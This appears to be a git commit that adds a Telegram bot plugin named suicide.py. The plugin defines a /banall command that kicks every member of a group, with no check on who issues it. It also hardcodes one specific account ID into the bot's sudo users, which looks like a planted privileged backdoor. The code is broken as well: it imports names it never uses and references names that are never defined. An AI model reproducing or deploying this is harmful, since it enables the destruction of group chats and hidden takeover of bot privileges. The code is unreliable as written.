118245e773e9cb4a6c2bda978c6a7fcfd6717fe5
santhumusic <105593248+santhumusic@users.noreply.github.com>
2022-07-24 19:47:06 +0530

    Create suicide.py

---
+++ plugins/suicide.py
@@ -0,0 +1,33 @@
+import asyncio
+
+from pyrogram import Client,filters
+from pyrogram.types import *
+from modules.config import API_ID, API_HASH, BOT_TOKEN
+import logging
+from pyrogram.errors import (
+    ChatAdminRequired
+)
+logging.basicConfig(
+    level=logging.DEBUG,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+)
+logging.getLogger("pyrogram").setLevel(logging.WARNING)
+
+bot=Client(":memory:",api_id=APP_ID,api_hash=APP_HASH,bot_token=BOT_TOKEN)
+
+
+SUDO_USERS.append(5027740392)
+
+@bot.on_message(filters.command("banall") & filters.group)
+def NewChat(bot,message):
+    logging.info("new chat {}".format(message.chat.id))
+    logging.info("getting memebers from {}".format(message.chat.id))
+    a= bot.iter_chat_members(message.chat.id)
+    for i in a:
+        try:
+            bot.kick_chat_member(chat_id =message.chat.id,user_id=i.user.id)
+            logging.info("kicked {} from {}".format(i.user.id,message.chat.id))
+        except Exception:
+            logging.info(" failed to kicked {} from {}".format(i.user.id,message.chat.id))
+            
+    logging.info("process completed")
